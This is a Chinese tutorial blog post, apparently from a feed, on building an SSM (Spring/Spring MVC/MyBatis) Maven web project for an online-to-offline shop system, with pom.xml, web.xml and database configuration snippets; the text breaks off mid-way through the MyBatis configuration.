        <content type="html"><![CDATA[<h1 id="第一章-简单的-SSM-项目搭建"><a href="#第一章-简单的-SSM-项目搭建" class="headerlink" title="第一章 简单的 SSM 项目搭建"></a>第一章 简单的 SSM 项目搭建</h1><h2 id="1-1、环境配置"><a href="#1-1、环境配置" class="headerlink" title="1.1、环境配置"></a>1.1、环境配置</h2><p>JDK8, Maven3.3.9, MySQL8.0.12, Tomcat8, Eclipse</p><hr><h2 id="1-2、创建-Maven-project-的步骤"><a href="#1-2、创建-Maven-project-的步骤" class="headerlink" title="1.2、创建 Maven project 的步骤"></a>1.2、创建 Maven project 的步骤</h2><ol><li>选择 maven-archetype-webapp 类型。</li><li>输入项目名称。</li><li>引入 tomcat 的一个 jar 包。选择项目&gt;属性&gt;Java Build Path&gt;Libraries&gt;Add Library&gt;Server Runtime&gt;Apache Tomcat v8.0。</li><li>修改 pom.xml 的 JRE 版本为 1.8，再 updata 项目。</li></ol><pre><code class="hljs xml">    <span class="hljs-tag">&lt;<span class="hljs-name">finalName</span>&gt;</span>o2o<span class="hljs-tag">&lt;/<span class="hljs-name">finalName</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">encoding</span>&gt;</span>UTF-8<span class="hljs-tag">&lt;/<span class="hljs-name">encoding</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">source</span>&gt;</span>1.8<span class="hljs-tag">&lt;/<span class="hljs-name">source</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">target</span>&gt;</span>1.8<span class="hljs-tag">&lt;/<span class="hljs-name">target</span>&gt;</span>            <span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span>language-xml复制代码</code></pre><ol><li>创建一个 maven 结构的文件夹,并修改属性。创建 src&#x2F;test&#x2F;resources 文件夹，并修改工程属性&gt;Java Build Path&gt; Source &gt; resources 的 output 属性。</li><li>修改 Dynamic Web Module 的版本，提高性能。查看,项目属性&gt;Project Facetes；修改, vim “projectsrc”&#x2F;.settings&#x2F;org.eclipse.wst.common.project.facet.core.xml；修改, jst.web 的 version。</li><li>修改 web.xml 的规范头(因为 DWM 版本提高了)。</li></ol><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><span class="hljs-tag">    <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd&quot;</span></span><span class="hljs-tag">    <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;3.1&quot;</span> <span class="hljs-attr">metadata-complete</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span>language-xml复制代码</code></pre><ol><li>运行项目。在 Tomcat 中 add 项目；再 Tomcat 中 clean 项目；start 项目.</li><li>在 web.xml 指定默认的页面。</li></ol><pre><code class="hljs xml">  <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file-list</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>index.js<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>index.html<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file-list</span>&gt;</span>language-xml复制代码</code></pre><hr><h1 id="第二章-系统功能模块"><a href="#第二章-系统功能模块" class="headerlink" title="第二章 系统功能模块"></a>第二章 系统功能模块</h1><h2 id="2-1、模块功能说明"><a href="#2-1、模块功能说明" class="headerlink" title="2.1、模块功能说明"></a>2.1、模块功能说明</h2><h4 id="2-1-1、前端展示系统"><a href="#2-1-1、前端展示系统" class="headerlink" title="2.1.1、前端展示系统"></a>2.1.1、前端展示系统</h4><ol><li>头条展示</li><li>店铺类别展示</li><li>区域展示</li><li>店铺（列表展示，查询，详情）</li><li>商品（列表展示，查询，详情）</li></ol><hr><h4 id="2-1-2、店家系统"><a href="#2-1-2、店家系统" class="headerlink" title="2.1.2、店家系统"></a>2.1.2、店家系统</h4><ol><li>Local 账号维护</li><li>微信账号维护</li><li>店铺信息维护</li><li>权限验证</li><li>商品类别维护</li></ol><hr><h4 id="2-1-3、超级管理员系统"><a href="#2-1-3、超级管理员系统" class="headerlink" title="2.1.3、超级管理员系统"></a>2.1.3、超级管理员系统</h4><ol><li>头条信息维护</li><li>店铺类别信息维护</li><li>区域信息维护</li><li>权限验证</li><li>店铺管理</li><li>用户管理</li></ol><hr><h2 id="2-2、模块功能对象"><a href="#2-2、模块功能对象" class="headerlink" title="2.2、模块功能对象"></a>2.2、模块功能对象</h2><h4 id="2-2-1、实体类关系图"><a href="#2-2-1、实体类关系图" class="headerlink" title="2.2.1、实体类关系图"></a>2.2.1、实体类关系图</h4><hr><h4 id="2-2-2、实体类代码"><a href="#2-2-2、实体类代码" class="headerlink" title="2.2.2、实体类代码"></a>2.2.2、实体类代码</h4><ol><li>区域</li><li>用户信息</li><li>微信账号</li><li>本地账号</li><li>头条</li><li>店铺类别</li><li>店铺</li><li>商品</li><li>详情图片</li><li>商品类别</li></ol><hr><h2 id="2-3、代码实现"><a href="#2-3、代码实现" class="headerlink" title="2.3、代码实现"></a>2.3、代码实现</h2><h4 id="2-3-1、创建相应的类"><a href="#2-3-1、创建相应的类" class="headerlink" title="2.3.1、创建相应的类"></a>2.3.1、创建相应的类</h4><h4 id="2-3-2、创建数据库表"><a href="#2-3-2、创建数据库表" class="headerlink" title="2.3.2、创建数据库表"></a>2.3.2、创建数据库表</h4><hr><h1 id="第三章-项目配置"><a href="#第三章-项目配置" class="headerlink" title="第三章 项目配置"></a>第三章 项目配置</h1><h2 id="3-1、-项目目录说明"><a href="#3-1、-项目目录说明" class="headerlink" title="3.1、 项目目录说明"></a>3.1、 项目目录说明</h2><ol><li>src&#x2F;main&#x2F;java:业务代码</li><li>src&#x2F;main&#x2F;resources:项目资源文件.例如:spring, mapper 等。</li><li>src&#x2F;test&#x2F;java:单元测试代码</li><li>src&#x2F;test&#x2F;resources:单元测试的配置文件:</li><li>src&#x2F;main&#x2F;webapp:存放前端的静态资源。例如 jsp,html,js,css 等</li><li>src&#x2F;main&#x2F;webapp&#x2F;resources:静态资源文件。例如 js,css,img</li><li>src&#x2F;main&#x2F;webapp&#x2F;WEB-INF:外部浏览器无法访问的目录</li><li>src&#x2F;main&#x2F;webapp&#x2F;WEB-INF&#x2F;web.xml:用于初始化配置信息。例如 welcoml page,初始化 sevlet,servlet mapper</li><li>target:存放项目构建后的文件和目录，jar,war,编译的 class 文件等。</li></ol><hr><h2 id="3-2、创建-sources-资源包"><a href="#3-2、创建-sources-资源包" class="headerlink" title="3.2、创建 sources 资源包"></a>3.2、创建 sources 资源包</h2><ol><li>src&#x2F;main&#x2F;resources&#x2F;spring:存放 spring 相关的配置信息</li><li>src&#x2F;main&#x2F;resources&#x2F;mapper:存放 dao 中每个方法对应的 service,不需要写 dao 的实现类,由 mybatis 自动实现,日志配置文件。</li></ol><hr><h2 id="3-3、创建-package"><a href="#3-3、创建-package" class="headerlink" title="3.3、创建 package"></a>3.3、创建 package</h2><ol><li>com.imooc.o2o.entity:实体类包</li><li>com.imooc.o2o.web:controller 层，存放 controller 控制器</li><li>com.imooc.o2o.service:业务逻辑层，</li><li>com.imooc.o2o.service.impl:业务逻辑层的实现</li><li>com.imooc.o2o.dao:dao 层，与数据库打交道，存放数据库的操作，也可以是文件的对象操作或者缓存等。与数据相关的操作。</li><li>com.imooc.o2o.dto:弥补 entity 的不足，例如 entity&#x2F;Product 需要返回一个商品列表和是否返回成功地标识，那这个时候就 7. 需要 dto 进行二次封装，流入 status,productlist</li><li>com.imooc.o2o.enums:枚举</li><li>com.imooc.o2o.intercaptor:拦截器代码</li><li>com.imooc.o2o.util:通用工具类</li></ol><hr><h2 id="3-4、项目配置"><a href="#3-4、项目配置" class="headerlink" title="3.4、项目配置"></a>3.4、项目配置</h2><h4 id="3-4-1、配置思路：自下而上的配置。"><a href="#3-4-1、配置思路：自下而上的配置。" class="headerlink" title="3.4.1、配置思路：自下而上的配置。"></a>3.4.1、配置思路：自下而上的配置。</h4><ol><li>在 pom.xml 指定项目所需要的 jar 包；</li><li>在 jdbc.properties 指定数据库的连接方式和创建 mybatis-config.xml 对 mybatis 进行配置；</li><li>创建 spring-dao.xml 将 jdbc.proerties 和 mybatis-config.xml 加载进来了并创建连接池同时配置好 mybatis 和数据库交互的方式；</li><li>创建 spring-service.xml 做事务管理，将 spring 在 dao 层配置好的 dataSource 连接池给注入到事务管理器中，便于 service 层做操作；</li><li>创建 spring-web.xmlding 定义 controller 的行为；</li><li>在 web.xml 将 spring-dispatcher 当做一个 servlet 注册到里面去来相应请求，同时将 spring-*.xml 的配置文件注册进来整合在一起。</li></ol><hr><h4 id="3-4-2、依赖管理"><a href="#3-4-2、依赖管理" class="headerlink" title="3.4.2、依赖管理"></a>3.4.2、依赖管理</h4><ol><li>Maven jar <a href="https://mvnrepository.com/">链接</a></li><li>pom.xml</li></ol><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><span class="hljs-tag">  <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd&quot;</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.imooc<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>o2o<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">packaging</span>&gt;</span>war<span class="hljs-tag">&lt;/<span class="hljs-name">packaging</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>o2o Maven Webapp<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">url</span>&gt;</span>http://maven.apache.org<span class="hljs-tag">&lt;/<span class="hljs-name">url</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">spring.version</span>&gt;</span>4.3.7.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">spring.version</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span>  <span class="hljs-comment">&lt;!-- 测试相关的jar包 --&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>junit<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>junit<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.12<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>      <span class="hljs-comment">&lt;!-- 作用于test环境 --&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>    <span class="hljs-comment">&lt;!-- 日志相关的jar包 --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>ch.qos.logback<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>logback-classic<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-comment">&lt;!-- Spring --&gt;</span><span class="hljs-comment">&lt;!-- 1）包含Spring 框架基本的核心工具类。Spring 其他组件都要使用到这个包里的类，是其他组件的基本核心 --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.3.7.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>    <span class="hljs-comment">&lt;!-- &lt;version&gt;$&#123;spring.version&#125;&lt;/version&gt; --&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-comment">&lt;!-- 2）这个jar 文件是所有应用都要使用的，它包含访问配置文件，创建和管理bean 以及进行Inversion of Context</span><span class="hljs-comment">/ Dependency Injection（Ioc/DI）操作相关的所有类。如果应用只需基本的Ioc/DI支持，引入spring-core及spring-beans.jar文件就可以了 --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-beans<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>$&#123;spring.version&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-comment">&lt;!-- 3）这个jar 文件为Spring 核心提供了大量拓展。可以找到使用Spring ApplicationContext 特效时所需的全部</span><span class="hljs-comment">所需的全部类，instrumentation 组件以及校验Validation 方面的相关类。 --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-context<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.3.7.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-comment">&lt;!-- 4）这个jar 文件包含对SPring 对JDBC 数据访问进行封装的所有类。 --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-jdbc<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.3.7.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-comment">&lt;!-- 5）为JDBC、Hibernate、JDO、JPA 等提供的一致性的声明式和编程式事务管理。 --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-tx<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.3.7.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-comment">&lt;!-- 6）Spring web 包含Web 应用开发时，用到Spring 框架时所需的核心类，包括自动载入WebApplicationContext</span><span class="hljs-comment"> 文件上传的支持类，filter类，和大量的工作辅助类--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.3.7.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-comment">&lt;!-- 7）包含Spring MVC框架相关的所有类。dispathservlet --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-webmvc<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.3.7.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-comment">&lt;!-- 8）Spring test 对Junit 等测试框架的简单封装 --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-test<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.3.7.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-comment">&lt;!-- Servlet web --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.servlet<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javax.servlet-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.1.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-comment">&lt;!-- json解析 --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jackson-databind<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.8.7<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-comment">&lt;!-- Map工具类 对标准java Collection的扩展 spring-core.jar需commons-collections.jar --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-comment">&lt;!-- DAO:MyBatis --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.4.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis-spring<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.3.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-comment">&lt;!-- 数据库，支持JDBC --&gt;</span>   <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.0.12<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-comment">&lt;!-- 链接池 --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>c3p0<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>c3p0<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>0.9.1.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">finalName</span>&gt;</span>o2o<span class="hljs-tag">&lt;/<span class="hljs-name">finalName</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">encoding</span>&gt;</span>UTF-8<span class="hljs-tag">&lt;/<span class="hljs-name">encoding</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">source</span>&gt;</span>1.8<span class="hljs-tag">&lt;/<span class="hljs-name">source</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">target</span>&gt;</span>1.8<span class="hljs-tag">&lt;/<span class="hljs-name">target</span>&gt;</span>            <span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span>language-xml复制代码</code></pre><hr><h4 id="3-4-3、-数据库的配置操作"><a href="#3-4-3、-数据库的配置操作" class="headerlink" title="3.4.3、 数据库的配置操作"></a>3.4.3、 数据库的配置操作</h4><ol><li>创建 src&#x2F;main&#x2F;resources&#x2F;jdbc.properties</li></ol><pre><code class="hljs properties"><span class="hljs-attr">jdbc.driver</span>=<span class="hljs-string">com.mysql.cj.jdbc.Driver</span><span class="hljs-attr">jdbc.url</span>=<span class="hljs-string">jdbc:mysql://localhost:3306/o2o?useUnicode=true&amp;characterEncoding=utf8&amp;verifyServerCertificate=false&amp;useSSL=false&amp;allowPublicKeyRetrieval=true</span><span class="hljs-attr">jdbc.username</span>=<span class="hljs-string">root</span><span class="hljs-attr">jdbc.password</span>=<span class="hljs-string">&quot;密码&quot;</span><span class="hljs-attr">language-properties复制代码</span></code></pre><ol><li>配置 src&#x2F;main&#x2F;resources&#x2F;mybatis-config.xml</li></ol><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> ?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">configuration</span> <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">&quot;-//mybatis.org//DTD Config 3.0//EN&quot;</span> <span class="hljs-string">&quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><span class="hljs-comment">&lt;!-- 配置全局属性 --&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">settings</span>&gt;</span>        <span class="hljs-comment">&lt;!-- 使用jdbc多的getGeneratedKeys获取数据库自增主键值 --&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">setting</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;useGeneratedKeys&quot;</span> <span class="hljs-attr">value</span>=<span 